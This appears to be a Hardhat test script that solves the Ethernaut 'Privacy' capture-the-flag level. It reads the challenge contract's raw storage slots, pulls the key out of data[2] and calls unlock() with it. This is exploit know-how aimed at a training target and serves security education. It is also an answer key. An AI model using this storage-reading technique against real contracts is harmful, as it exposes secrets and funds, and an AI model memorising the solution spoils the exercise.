import { expect } from "chai";
import { utils, BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Privacy", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`Privacy`);
        const challengeAddress = await createChallenge(
            `0xcAac6e4994c2e21C5370528221c226D1076CfDAB`, ethers.utils.parseEther("1.0")
        );
        challenge = await challengeFactory.attach(challengeAddress);

        return { eoa, challenge };
    }

    it("solves the challenge", async function () {
        const { eoa, challenge } = await loadFixture(deployTokenFixture);

        try {
            // storage is allocated to slots like this:
            // https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html
            // 0: locked
            // 1: ID
            // 2: flattening, denomination, awkwardness (storage can be packed into a 256 bit slot)
            // 3: data[0] (because **fixed** size array)
            // 4: data[1]
            // 5: data[2]
            const storageSlots = [0, 1, 2, 3, 4, 5, 6]
            for (const slot of storageSlots) {
                const slotData = await eoa.provider!.getStorageAt(challenge.address, slot)
                console.log(`${slot}:\t ${slotData} (${BigNumber.from(slotData).toString()})`)
            }
            console.log(`Printing data static array`)
            for (const slot of [0, 1, 2]) {
                const slotData = await eoa.provider!.getStorageAt(challenge.address, 3 + slot)
                console.log(`data[${slot}]:\t ${slotData} (${Buffer.from(slotData.slice(2), "hex").toString("utf8")})`)
            }
            const keyData = await eoa.provider!.getStorageAt(challenge.address, 5 /* data[2] */)
            // seems to take the most significant bits data[2][0..15] when doing bytes16(data[2])
            const key16 = `${keyData.slice(0, 34)}` // bytes16 = 16 bytes
            tx = await challenge.unlock(key16)
            await tx.wait()

        } catch (err) {
            console.log("error: " + err);
        }


    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
